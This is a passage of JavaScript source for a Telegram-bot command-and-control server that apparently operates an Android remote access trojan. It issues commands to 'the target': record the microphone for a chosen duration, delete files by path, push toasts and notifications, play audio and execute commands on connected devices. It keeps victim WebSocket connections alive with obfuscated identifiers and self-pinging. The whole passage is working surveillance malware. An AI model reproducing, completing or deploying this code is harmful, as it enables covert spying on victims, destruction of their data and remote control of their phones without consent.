    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
  if (cmd == 'microphone') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
  if (cmd == 'toast') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
  if (cmd == 'show_notification') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
  if (cmd == 'play_audio') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
})

function sendWaitMsg() {
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
          ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
        ],
        resize_keyboard: true,
      },
    }
  )
}

setInterval(function () {
  appSocket.clients.forEach(function (_0x41c8f7) {
    if (_0x41c8f7.readyState === webSocket.OPEN) {
        _0x41c8f7.send('ping')
    }
  })
  try {
    const myUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 8999}`;
    axios.get(myUrl).catch(()=> {})
  } catch (e) {}
}, 5000)

appServer.listen(process.env.PORT || 8999)
